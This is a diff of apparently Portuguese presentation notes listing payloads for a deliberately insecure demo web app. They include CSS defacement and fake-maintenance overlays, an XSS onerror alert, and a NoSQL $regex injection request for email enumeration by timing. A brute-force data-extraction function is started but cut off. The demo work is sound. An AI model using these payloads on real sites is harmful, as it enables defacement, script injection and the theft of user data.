@@ -2,16 +2,21 @@ projeto inseguro: https://apiinjection-dev-8cwcq9.azurewebsites.net/
 
 
 
-Pay
- loader: agressivo: <style> body::after { content: "SITE HACKEADO"; 
+Pay loader agressivo: 
+
+<style> body::after { content: "SITE HACKEADO"; 
 position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
 background-color: black; color: lime; font-size: 50px; text-align: 
-center; padding-top: 20vh; z-index: 9999; } </style> (Usar no 
-final da apresentação)
+center; padding-top: 20vh; z-index: 9999; } </style> 
+
+(Usar no final da apresentação)
+
 
 Pop up: <img src="x" onerror="alert('Vulnerabilidade XSS Detetada na Aplicação!');">
 
+Imagem:
 <img src="https://pbs.twimg.com/media/G85YFqzW8AAWmAm.jpg" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; margin-top: 10px; display: block;">
+
 
 
 
@@ -22,12 +27,14 @@ fetch('/api/auth/login', {
     email: { "$regex": "^j" }, 
     password: "senha_errada"
   })
-}).then(() => console.log("Se demorou ~100ms, um email existe"));
+}).then(() => console.log("Se demorou ~100ms ou mais, um email existe"));
 
 
 repo: https://github.com/ArthurGomes11/api-injection-test
-Você, 2 min
-play loader de captura: <style>
+
+
+play loader de captura: 
+<style>
   /* Esconde os produtos reais e mostra uma mensagem de 'Manutenção' */
   .products-list { display: none; }
   body::before { 
@@ -35,6 +42,8 @@ play loader de captura: <style>
     display: block; background: yellow; color: black; padding: 20px; font-weight: bold; text-align: center;
   }
 </style>
+
+Brute force via 
 async function extrairDadosEstavel() {
     const caracteres = "admin@loja.com123456789-_.";
     let descoberto = "";
